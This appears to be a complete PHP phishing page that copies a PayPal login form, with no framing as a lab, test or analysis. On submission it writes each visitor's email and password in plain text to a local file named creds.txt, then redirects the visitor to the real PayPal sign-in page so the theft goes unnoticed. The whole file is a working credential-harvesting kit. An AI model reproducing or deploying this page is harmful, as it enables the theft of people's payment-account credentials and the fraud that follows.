<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    if ($username && $password) {
        $data = "Username: $username | Password: $password\n";
        file_put_contents('creds.txt', $data, FILE_APPEND | LOCK_EX);
        header('Location: https://www.paypal.com/signin');
        exit();
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <title>PayPal Login</title>
</head>
<body>
    <h2>PayPal Login</h2>
    <form method="POST">
        <input type="text" name="username" placeholder="Email or mobile number" required><br><br>
        <input type="password" name="password" placeholder="Password" required><br><br>
        <button type="submit">Log In</button>
    </form>
</body>
</html>
